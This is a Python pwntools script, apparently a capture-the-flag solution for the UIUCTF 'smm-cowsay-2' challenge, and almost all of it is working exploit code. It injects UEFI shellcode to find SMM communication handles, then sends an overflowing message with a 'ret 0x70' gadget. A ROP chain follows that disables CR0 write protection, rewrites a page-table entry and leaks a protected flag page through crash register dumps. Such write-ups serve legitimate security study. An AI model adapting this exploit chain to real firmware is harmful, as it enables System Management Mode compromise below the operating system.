#!/usr/bin/env python3
#
# @mebeim - 2022-08-15
#

import os
os.environ['PWNLIB_NOTERM'] = '1'
from pwn import *

HOST = 'smm-cowsay-2.chal.uiuc.tf'
PORT = 1337
context(arch='amd64')

def connect(prev_conn=None, quiet=False):
	if quiet:
		prev_log_level = context.log_level
		context.log_level = 'ERROR'

	if prev_conn is not None:
		prev_conn.close()

	if args.REMOTE:
		r = remote(HOST, PORT)
	else:
		os.chdir('handout/run')
		r = process('./run.sh')
		os.chdir('../..')

	if quiet:
		context.log_level = prev_log_level

	return r


gEfiSmmCommunicationProtocolGuid = 0x32c3c5ac65db949d4cbd9dc6c68ed8e2
gEfiSmmCowsayCommunicationGuid = 0xf79265547535a8b54d102c839a75cf12
EfiRuntimeServicesData = 6
conn = None

def expl(leak_addr):
	global conn
	log.info('Leaking 8 bytes at 0x%x...', leak_addr)

	conn = connect(conn, quiet=True)
	conn.recvuntil(b'Address of SystemTable: ')
	system_table = int(conn.recvline(), 16)
	# log.info('SystemTable @ 0x%x', system_table)

	code = asm(f'''
	mov rax, {system_table}
	mov rax, qword ptr [rax + 96]  /* SystemTable->BootServices */
	mov rbx, qword ptr [rax + 64]  /* BootServices->AllocatePool */
	mov rcx, qword ptr [rax + 320] /* BootServices->LocateProtocol */
	''')
	conn.sendline(code.hex().encode() + b'\ndone')

	conn.recvuntil(b'RBX: 0x')
	AllocatePool = int(conn.recvn(16), 16)
	conn.recvuntil(b'RCX: 0x')
	LocateProtocol = int(conn.recvn(16), 16)

	# log.success('BootServices->AllocatePool   @ 0x%x', AllocatePool)
	# log.success('BootServices->LocateProtocol @ 0x%x', LocateProtocol)

	code = asm(f'''
		/* LocateProtocol(gEfiSmmCommunicationProtocolGuid, NULL, &protocol) */
		lea rcx, qword ptr [rip + guid]
		xor rdx, rdx
		lea r8, qword ptr [rip + protocol]
		mov rax, {LocateProtocol}
		call rax

		test rax, rax
		jnz fail

		mov rax, qword ptr [rip + protocol] /* mSmmCommunication */
		mov rbx, qword ptr [rax]            /* mSmmCommunication->Communicate */
		ret

	fail:
		ud2

	guid:
		.octa {gEfiSmmCommunicationProtocolGuid}
	protocol:
	''')
	conn.sendline(code.hex().encode() + b'\ndone')

	conn.recvuntil(b'RAX: 0x')
	mSmmCommunication = int(conn.recvn(16), 16)
	conn.recvuntil(b'RBX: 0x')
	Communicate = int(conn.recvn(16), 16)

	# log.success('mSmmCommunication              @ 0x%x', mSmmCommunication)
	# log.success('mSmmCommunication->Communicate @ 0x%x', Communicate)

	code = asm(f'''
		/* AllocatePool(EfiRuntimeServicesData, 0x1000, &buffer) */
		mov rcx, {EfiRuntimeServicesData}
		mov rdx, 0x1000
		lea r8, qword ptr [rip + buffer]
		mov rax, {AllocatePool}
		call rax

		test rax, rax
		jnz fail

		mov rax, qword ptr [rip + buffer]
		ret

	fail:
		ud2

	buffer:
	''')
	conn.sendline(code.hex().encode() + b'\ndone')

	conn.recvuntil(b'RAX: 0x')
	buffer = int(conn.recvn(16), 16)

	# log.success('Allocated buffer @ 0x%x', buffer)

	ret_0x70 = 0x7F83000 + 0x8a49 # VariableSmm.efi + 0x8a49: ret 0x70
	payload  = 'A'.encode('utf-16-le') * 200 + p64(ret_0x70)

	real_chain = [
		# Unset CR0.WP
		0x7f8a184 , # pop rax ; ret
		0x80000033, # -> RAX
		0x7fcf70d , # mov cr0, rax ; wbinvd ; ret

		# Set flag page PTE as present
		# PTE: 0x7ed0200, VALUE: 0x8000000044440066
		0x7f8a184         , # pop rax ; ret
		0x7ed0200         , # -> RAX
		0x7fc123d         , # pop rdx ; ret
		0x8000000044440067, # -> RDX
		0x7fc9385         , # mov dword ptr [rax], edx ; xor eax, eax ;
							# pop rbx ; pop rbp ; pop r12 ; ret
		0x1337, # filler
		0x1337, # filler
		0x1337, # filler

		# Read flag into RAX and then let everything chain
		# crash to simply leak it from the register dump
		0x7ee8222, # pop rsi ; ret (do not mess up RAX with sub/add)
		0x0      , # -> RSI
		0x7fc123d, # pop rdx ; ret (do not mess up RAX with sub/add)
		0x0      , # -> RDX
		0x7ee82fe, # pop rdi ; ret
		leak_addr, # -> RDI (flag address)
		0x7ff7b2c, # mov rax, qword ptr [rdi] ; sub rsi, rdx ; add rax, rsi ; ret
	]

	# Transform real ROP chain into .quad directives to embed in the shellcode:
	#   .quad 0x7f8a184
	#   .quad 0x80000033
	#    ...

	real_chain_size = len(real_chain) * 8
	real_chain      = '.quad ' + '\n.quad '.join(map(str, real_chain))

	code = asm(f'''
		/* Copy data into allocated buffer */
		lea rsi, qword ptr [rip + data]
		mov rdi, {buffer}
		mov rcx, {0x18 + len(payload)}
		cld
		rep movsb

		/* Copy real ROP chain into buffer + 0x800 */
		lea rsi, qword ptr [rip + real_chain]
		mov rdi, {buffer + 0x800}
		mov rcx, {real_chain_size}
		cld
		rep movsb

		/* Communicate(mSmmCommunication, buffer, NULL) */
		mov rcx, {mSmmCommunication}
		mov rdx, {buffer}
		xor r8, r8
		mov rax, {Communicate}

		/* These two regs will spill on SMI stack */
		mov r14, 0x7fe5269         /* pop rsp; ret */
		mov r15, {buffer + 0x800}  /* -> RSP */
		call rax

		test rax, rax
		jnz fail
		ret

	fail:
		ud2

	real_chain:
		{real_chain}

	data:
		.octa {gEfiSmmCowsayCommunicationGuid} /* Buffer->HeaderGuid */
		.quad {len(payload)}                   /* Buffer->MessageLength */
		/* payload will be appended here to serve as Buffer->Data */
	''')

	conn.sendline(code.hex().encode() + payload.hex().encode() + b'\ndone')
	conn.recvuntil(b'RAX  - ')
	return p64(int(conn.recvn(16), 16))


flag = ''
for off in range(0, 0x100, 8):
	chunk = expl(0x44440000 + off)
	flag += chunk.decode()
	log.success(flag)

	if '}' in flag:
		break
